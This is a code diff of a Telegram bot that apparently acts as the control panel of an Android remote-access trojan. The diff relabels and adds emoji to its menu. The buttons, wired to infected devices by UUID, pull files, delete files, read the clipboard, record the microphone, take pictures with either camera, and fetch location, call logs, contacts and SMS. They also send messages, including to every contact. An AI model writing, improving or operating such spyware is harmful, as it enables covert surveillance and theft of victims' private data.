@@ -375,51 +375,51 @@ appBot.on("callback_query", (callbackQuery) => {
     const uuid = data.split(':')[1]
     console.log(uuid)
     if (commend == 'device') {
-        appBot.editMessageText(`°• حدد الثناء للجهاز : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
+        appBot.editMessageText(`📱 • لوحة تحكم الجهاز: <b>${appClients.get(data.split(':')[1]).model}</b>`, {
             width: 10000,
             chat_id: id,
             message_id: msg.message_id,
             reply_markup: {
                 inline_keyboard: [
                     [
-                        {text: 'التطبيقات', callback_data: `apps:${uuid}`},
-                        {text: 'معلومات الجهاز', callback_data: `device_info:${uuid}`}
+                        {text: '📦 التطبيقات', callback_data: `apps:${uuid}`},
+                        {text: 'ℹ️ معلومات الجهاز', callback_data: `device_info:${uuid}`}
                     ],
                     [
-                        {text: 'الحصول علئ الملفات', callback_data: `file:${uuid}`},
-                        {text: 'حذف ملف', callback_data: `delete_file:${uuid}`}
+                        {text: '📁 تصفح الملفات', callback_data: `file:${uuid}`},
+                        {text: '🗑️ حذف ملف', callback_data: `delete_file:${uuid}`}
                     ],
                     [
-                        {text: 'الحافظة', callback_data: `clipboard:${uuid}`},
-                        {text: 'المكرفون', callback_data: `microphone:${uuid}`},
+                        {text: '📋 الحافظة', callback_data: `clipboard:${uuid}`},
+                        {text: '🎙️ الميكروفون', callback_data: `microphone:${uuid}`},
                     ],
                     [
-                        {text: 'الكاميرا الامامي', callback_data: `camera_main:${uuid}`},
-                        {text: 'الكاميرا السلفي', callback_data: `camera_selfie:${uuid}`}
+                        {text: '📷 الكاميرا الخلفية', callback_data: `camera_main:${uuid}`},
+                        {text: '🤳 الكاميرا الأمامية', callback_data: `camera_selfie:${uuid}`}
                     ],
                     [
-                        {text: 'الموقع', callback_data: `location:${uuid}`},
-                        {text: 'نخب', callback_data: `toast:${uuid}`}
+                        {text: '📍 الموقع الجغرافي', callback_data: `location:${uuid}`},
+                        {text: '💬 إرسال إشعار Toast', callback_data: `toast:${uuid}`}
                     ],
                     [
-                        {text: 'المكالمات', callback_data: `calls:${uuid}`},
-                        {text: 'جهات الاتصال', callback_data: `contacts:${uuid}`}
+                        {text: '📞 سجل المكالمات', callback_data: `calls:${uuid}`},
+                        {text: '📇 جهات الاتصال', callback_data: `contacts:${uuid}`}
                     ],
                     [
-                        {text: 'يهتز', callback_data: `vibrate:${uuid}`},
-                        {text: 'اظهار الاخطار', callback_data: `show_notification:${uuid}`}
+                        {text: '📳 اهتزاز الجهاز', callback_data: `vibrate:${uuid}`},
+                        {text: '🔔 إظهار إشعار', callback_data: `show_notification:${uuid}`}
                     ],
                     [
-                        {text: 'الرسايل', callback_data: `messages:${uuid}`},
-                        {text: 'ارسال رسالة', callback_data: `send_message:${uuid}`}
+                        {text: '📩 الرسائل النصية', callback_data: `messages:${uuid}`},
+                        {text: '✉️ إرسال رسالة', callback_data: `send_message:${uuid}`}
                     ],
                     [
-                        {text: 'تشغيل ملف صوتي', callback_data: `play_audio:${uuid}`},
-                        {text: 'ايقاف الملف الصوتي', callback_data: `stop_audio:${uuid}`},
+                        {text: '🎵 تشغيل صوت', callback_data: `play_audio:${uuid}`},
+                        {text: '🔇 إيقاف الصوت', callback_data: `stop_audio:${uuid}`},
                     ],
                     [
                         {
-                            text: 'ارسال رسالة الئ جميع جهة اتصال',
+                            text: '📢 إرسال رسالة لجميع جهات الاتصال',
                             callback_data: `send_message_to_all:${uuid}`
                         }
                     ],
@@ -428,6 +428,7 @@ appBot.on("callback_query", (callbackQuery) => {
             parse_mode: "HTML"
         })
     }
+
     if (commend == 'calls') {
         appSocket.clients.forEach(function each(ws) {
             if (ws.uuid == uuid) {
